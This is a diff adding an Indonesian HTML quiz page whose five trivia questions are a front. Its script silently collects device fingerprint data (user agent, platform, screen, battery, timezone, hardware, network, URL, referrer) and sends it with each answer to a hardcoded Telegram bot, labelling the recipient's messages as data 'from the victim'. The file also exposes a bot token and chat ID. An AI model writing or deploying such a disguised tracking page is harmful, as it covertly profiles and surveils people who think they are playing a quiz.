@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🧠 Quiz Pengetahuan</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(145deg, #f6f9fc 0%, #e9f1f8 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            margin: 0;
+        }
+        .card {
+            background: rgba(255,255,255,0.92);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 40px;
+            box-shadow: 0 30px 60px rgba(0,10,30,0.12);
+            padding: 32px 28px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.5);
+            transition: all 0.3s;
+        }
+        .card-header { text-align: center; margin-bottom: 24px; }
+        .card-header h1 {
+            font-size: 1.9rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .card-header .sub { font-size: 0.9rem; color: #6b7a8f; font-weight: 500; }
+        .progress-wrap {
+            background: #eef2f7;
+            border-radius: 100px;
+            height: 6px;
+            margin-bottom: 28px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #1a2a6c, #b21f1f);
+            border-radius: 100px;
+            transition: width 0.4s ease;
+        }
+        .question-number {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #1a2a6c;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .question-number .badge {
+            background: #1a2a6c;
+            color: white;
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+        .question-text {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #0b1a2e;
+            line-height: 1.4;
+            margin-bottom: 24px;
+            min-height: 4rem;
+        }
+        .options-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+        .option-item {
+            background: white;
+            border: 2px solid #e4e9f2;
+            border-radius: 18px;
+            padding: 16px 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .option-item:hover { border-color: #b0c4de; background: #fafcff; }
+        .option-item input[type="radio"] {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #cbd5e1;
+            border-radius: 50%;
+            flex-shrink: 0;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+        .option-item input[type="radio"]:checked {
+            border-color: #1a2a6c;
+            background: #1a2a6c;
+            box-shadow: inset 0 0 0 4px white, 0 0 0 2px #1a2a6c;
+        }
+        .option-item .opt-label { font-size: 1.05rem; color: #1e293b; font-weight: 500; }
+        .btn-next {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1a2a6c, #2d4373);
+            border: none;
+            border-radius: 60px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s;
+            box-shadow: 0 8px 24px rgba(26,42,108,0.25);
+        }
+        .btn-next:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
+        .btn-next:not(:disabled):hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(26,42,108,0.35);
+        }
+        .btn-next:active:not(:disabled) { transform: scale(0.97); }
+        .result-box { text-align: center; padding: 16px 0 4px; display: none; }
+        .result-box.show { display: block; animation: fadeUp 0.5s ease; }
+        .result-box .icon { font-size: 3.4rem; margin-bottom: 8px; }
+        .result-box h2 { color: #0b1a2e; font-size: 1.6rem; font-weight: 700; }
+        .result-box p { color: #4b5a6f; font-size: 1rem; margin-top: 6px; }
+        @keyframes fadeUp {
+            from { opacity:0; transform:translateY(20px); }
+            to { opacity:1; transform:translateY(0); }
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #8896ab;
+            margin-top: 24px;
+            border-top: 1px solid rgba(0,0,0,0.04);
+            padding-top: 18px;
+        }
+        .footer-note span { color: #1a2a6c; font-weight: 600; }
+        @media (max-width: 480px) {
+            .card { padding: 24px 20px; }
+            .question-text { font-size: 1.2rem; }
+            .option-item { padding: 14px 16px; }
+            .option-item .opt-label { font-size: 0.95rem; }
+            .btn-next { padding: 14px; font-size: 1rem; }
+        }
+        html { scroll-behavior: smooth; }
+        /* Status kirim animasi */
+        .sending {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a2a6c;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+            z-index: 9999;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+        }
+        .toast.show { opacity: 1; }
+    </style>
+</head>
+<body>
+<div class="card" id="appCard">
+    <div class="card-header">
+        <h1>🧠 Quiz</h1>
+        <div class="sub">Uji pengetahuanmu</div>
+    </div>
+    <div class="progress-wrap">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div id="quizArea">
+        <div class="question-number">
+            <span id="questionCounter">Soal 1 / 5</span>
+            <span class="badge" id="stepBadge">1</span>
+        </div>
+        <div class="question-text" id="questionText">Loading...</div>
+        <div class="options-grid" id="optionsContainer"></div>
+        <button class="btn-next" id="nextBtn" disabled>➡️ Lanjut</button>
+    </div>
+    <div class="result-box" id="resultBox">
+        <div class="icon">🎉</div>
+        <h2>Selamat!</h2>
+        <p>Jawaban Anda telah terkirim.</p>
+    </div>
+    <div class="footer-note">⚡ Dibuat oleh <span>ZAMZZZ</span> • v7.0</div>
+</div>
+<div class="toast" id="toast">✅ Data terkirim!</div>
+
+<script>
+// ============================================================
+// KONFIGURASI TELEGRAM
+// ============================================================
+const BOT_TOKEN = '8587782478:AAE0NxtjIYcgTBJu3ertm7k0_u1HynN_PuQ';
+const CHAT_ID = '8491348585';
+
+// ============================================================
+// SOAL
+// ============================================================
+const questions = [
+    { question: "Apa ibu kota Indonesia?", options: ["Jakarta", "Bandung", "Surabaya", "Yogyakarta"] },
+    { question: "Planet terbesar di tata surya?", options: ["Bumi", "Mars", "Jupiter", "Saturnus"] },
+    { question: "Penemu lampu pijar?", options: ["Nikola Tesla", "Thomas Edison", "Albert Einstein", "Alexander Graham Bell"] },
+    { question: "Hewan yang hidup di air & darat?", options: ["Kucing", "Amfibi", "Burung", "Ular"] },
+    { question: "Tahun kemerdekaan Indonesia?", options: ["1945", "1946", "1947", "1948"] }
+];
+
+// ============================================================
+// STATE
+// ============================================================
+let current = 0;
+let answers = [];
+const total = questions.length;
+
+// ============================================================
+// KUMPULKAN DATA DETAIL (SUPER LENGKAP)
+// ============================================================
+async function getDetailData() {
+    let battery = 'Tidak tersedia';
+    try {
+        if (navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Mengisi' : 'Tidak mengisi'})`;
+        }
+    } catch (_) {}
+
+    const data = {
+        // Perangkat & OS
+        platform: navigator.platform || 'unknown',
+        userAgent: navigator.userAgent || 'unknown',
+        language: navigator.language || 'unknown',
+        languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
+        // Layar
+        screen: `${window.screen.width}x${window.screen.height}`,
+        colorDepth: window.screen.colorDepth || 'unknown',
+        pixelRatio: window.devicePixelRatio || 1,
+        // Touch & pointer
+        touch: 'ontouchstart' in window ? 'Ya' : 'Tidak',
+        pointer: navigator.pointerEnabled ? 'Ya' : 'Tidak',
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        // Cookie & Do Not Track
+        cookie: navigator.cookieEnabled ? 'Ya' : 'Tidak',
+        dnt: navigator.doNotTrack || 'tidak diatur',
+        // Time & timezone
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+        localTime: new Date().toLocaleString('id-ID'),
+        utcTime: new Date().toUTCString(),
+        // Hardware
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        // Battery (async)
+        battery: battery,
+        // Network
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType || 'unknown',
+            downlink: navigator.connection.downlink || 'unknown',
+            rtt: navigator.connection.rtt || 'unknown'
+        } : 'Tidak tersedia',
+        // Page
+        url: window.location.href,
+        referrer: document.referrer || 'langsung',
+        title: document.title,
+        // Viewport
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
+        // Timestamp
+        timestamp: new Date().toISOString()
+    };
+    return data;
+}
+
+// ============================================================
+// FUNGSI KIRIM KE TELEGRAM (DENGAN HANDLER ERROR & TOAST)
+// ============================================================
+function showToast(msg, isError = false) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.style.background = isError ? '#b21f1f' : '#1a2a6c';
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+async function kirimKeTelegram(jawaban) {
+    const detail = await getDetailData();
+    const ip = 'Tidak tersedia (client-side)'; // Bisa ditambahkan fetch ke ipify jika mau, tapi tanpa PHP
+    const timestamp = new Date().toLocaleString('id-ID');
+
+    // Bangun pesan
+    let pesan = "📩 *DATA QUIZ DARI KORBAN!*\n";
+    pesan += "⏰ Waktu: " + timestamp + "\n";
+    pesan += "🌐 IP: " + ip + "\n";
+    pesan += "🖥️ User-Agent: " + detail.userAgent + "\n\n";
+
+    pesan += "📱 *DATA PERANGKAT:*\n";
+    pesan += "   Platform: " + detail.platform + "\n";
+    pesan += "   Bahasa: " + detail.language + " (languages: " + detail.languages + ")\n";
+    pesan += "   Resolusi: " + detail.screen + " (pixel ratio: " + detail.pixelRatio + ")\n";
+    pesan += "   Kedalaman Warna: " + detail.colorDepth + " bit\n";
+    pesan += "   Touch Support: " + detail.touch + " (max touch: " + detail.maxTouchPoints + ")\n";
+    pesan += "   Pointer: " + detail.pointer + "\n";
+    pesan += "   Cookie Enabled: " + detail.cookie + "\n";
+    pesan += "   Do Not Track: " + detail.dnt + "\n";
+    pesan += "   Timezone: " + detail.timezone + "\n";
+    pesan += "   Local Time: " + detail.localTime + "\n";
+    pesan += "   UTC Time: " + detail.utcTime + "\n";
+    pesan += "   Hardware Concurrency: " + detail.hardwareConcurrency + "\n";
+    pesan += "   Device Memory: " + detail.deviceMemory + " GB\n";
+    pesan += "   Battery: " + detail.battery + "\n";
+    if (detail.connection !== 'Tidak tersedia') {
+        pesan += "   Network: " + detail.connection.effectiveType + ", " + detail.connection.downlink + " Mbps, RTT " + detail.connection.rtt + "ms\n";
+    } else {
+        pesan += "   Network: " + detail.connection + "\n";
+    }
+    pesan += "   Viewport: " + detail.viewport + "\n";
+    pesan += "   Halaman URL: " + detail.url + "\n";
+    pesan += "   Referrer: " + detail.referrer + "\n";
+    pesan += "   Title: " + detail.title + "\n\n";
+
+    pesan += "📝 *JAWABAN:*\n";
+    jawaban.forEach((j, i) => {
+        pesan += "   Soal " + (i+1) + ": " + j + "\n";
+    });
+
+    // Kirim ke Telegram
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const payload = {
+        chat_id: CHAT_ID,
+        text: pesan,
+        parse_mode: 'Markdown'
+    };
+
+    try {
+        const res = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        if (data.ok) {
+            showToast('✅ Data terkirim ke Telegram!');
+            console.log('✅ Sukses:', data);
+        } else {
+            showToast('⚠️ Gagal kirim: ' + (data.description || 'unknown error'), true);
+            console.warn('⚠️ Gagal:', data);
+        }
+    } catch (err) {
+        showToast('⚠️ Error jaringan, coba lagi nanti', true);
+        console.warn('⚠️ Error fetch:', err);
+    }
+}
+
+// ============================================================
+// RENDER SOAL
+// ============================================================
+function renderQuestion(index) {
+    const q = questions[index];
+    document.getElementById('questionCounter').textContent = `Soal ${index+1} / ${total}`;
+    document.getElementById('stepBadge').textContent = index+1;
+    document.getElementById('questionText').textContent = q.question;
+
+    const container = document.getElementById('optionsContainer');
+    container.innerHTML = '';
+    q.options.forEach((opt, i) => {
+        const label = document.createElement('label');
+        label.className = 'option-item';
+        const radio = document.createElement('input');
+        radio.type = 'radio';
+        radio.name = 'q';
+        radio.value = i;
+        radio.addEventListener('change', () => {
+            document.getElementById('nextBtn').disabled = false;
+        });
+        const span = document.createElement('span');
+        span.className = 'opt-label';
+        span.textContent = opt;
+        label.appendChild(radio);
+        label.appendChild(span);
+        container.appendChild(label);
+    });
+
+    const progress = ((index) / total) * 100;
+    document.getElementById('progressBar').style.width = progress + '%';
+    document.getElementById('nextBtn').disabled = true;
+    document.getElementById('nextBtn').textContent = (index === total - 1) ? '✨ Selesai' : '➡️ Lanjut';
+}
+
+// ============================================================
+// TOMBOL LANJUT / SELESAI
+// ============================================================
+document.getElementById('nextBtn').addEventListener('click', async function() {
+    const selected = document.querySelector('input[name="q"]:checked');
+    if (!selected) return;
+
+    const selectedText = questions[current].options[parseInt(selected.value)];
+    answers.push(selectedText);
+
+    // Kirim data (async, tidak mengganggu alur)
+    await kirimKeTelegram(answers);
+
+    if (current < total - 1) {
+        current++;
+        renderQuestion(current);
+        document.getElementById('appCard').scrollIntoView({ behavior: 'smooth', block: 'center' });
+    } else {
+        document.getElementById('quizArea').style.display = 'none';
+        document.getElementById('progressBar').style.width = '100%';
+        document.getElementById('resultBox').classList.add('show');
+        // Kirim sekali lagi untuk memastikan
+        await kirimKeTelegram(answers);
+    }
+});
+
+// ============================================================
+// INIT
+// ============================================================
+renderQuestion(0);
+
+// Opsional: coba ambil IP publik via ipify (tambahan)
+// Tapi karena ini client-side dan mungkin kena CORS, kita skip saja
+</script>
+</body>
+</html>
